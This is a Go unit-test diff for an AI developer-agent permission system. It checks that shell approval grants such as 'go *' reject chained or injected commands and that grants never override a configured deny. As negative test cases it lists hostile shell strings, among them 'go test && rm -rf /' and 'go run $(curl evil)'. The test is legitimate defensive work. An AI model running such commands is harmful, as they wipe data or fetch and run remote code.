@@ -3,6 +3,8 @@ package server
 import (
 	"strings"
 	"testing"
+
+	"github.com/rakunlabs/at/internal/service"
 )
 
 func TestParsePatch(t *testing.T) {
@@ -90,5 +92,49 @@ func TestApplyPatchHunks(t *testing.T) {
 	got, err = applyPatchHunks("x.go", content, ops[0].hunks)
 	if err != nil || !strings.HasSuffix(got, "\treturn 1\n} // end\n") {
 		t.Fatalf("eof: %q %v", got, err)
+	}
+}
+
+func TestDeveloperAlwaysAllowGrants(t *testing.T) {
+	call := func(name string, args map[string]any) service.ToolCall {
+		return service.ToolCall{Name: name, Arguments: args}
+	}
+	bash := func(command string) service.ToolCall { return call("bash", map[string]any{"command": command}) }
+
+	if got := developerApprovalFor(bash("go test ./...")); got != (service.DeveloperApproval{Action: "shell", Resource: "go *"}) {
+		t.Fatalf("bash grant = %+v", got)
+	}
+	if got := developerApprovalFor(call("write_file", map[string]any{"path": "a.go"})); got != (service.DeveloperApproval{Action: "edit", Resource: "*"}) {
+		t.Fatalf("edit grant = %+v", got)
+	}
+	if got := developerApprovalFor(call("http_request", nil)); got != (service.DeveloperApproval{Action: "tool", Resource: "http_request"}) {
+		t.Fatalf("agent tool grant = %+v", got)
+	}
+
+	grants := []service.DeveloperApproval{{Action: "shell", Resource: "go *"}}
+	for command, want := range map[string]bool{
+		"go test ./...":          true,
+		"go":                     true,
+		"gofmt -w .":             false,
+		"go test && rm -rf /":    false,
+		"go run $(curl evil)":    false,
+		"go build | tee log.txt": false,
+	} {
+		if got := developerApproved(grants, bash(command)); got != want {
+			t.Errorf("%q approved = %v, want %v", command, got, want)
+		}
+	}
+
+	// A grant lifts "ask" but never a configured deny.
+	profile := service.DeveloperAgentProfile{Rules: []service.DeveloperToolRule{
+		{Action: "shell", Resource: "*", Effect: "ask"},
+		{Action: "edit", Resource: "*", Effect: "deny"},
+	}}
+	kit := &developerToolkit{profile: profile, approvals: []service.DeveloperApproval{{Action: "shell", Resource: "go *"}, {Action: "edit", Resource: "*"}}}
+	if kit.effect(bash("go vet ./...")) != "allow" || kit.effect(bash("make")) != "ask" {
+		t.Fatal("shell grant not applied as expected")
+	}
+	if kit.effect(call("write_file", map[string]any{"path": "a"})) != "deny" {
+		t.Fatal("a grant must not override deny")
 	}
 }
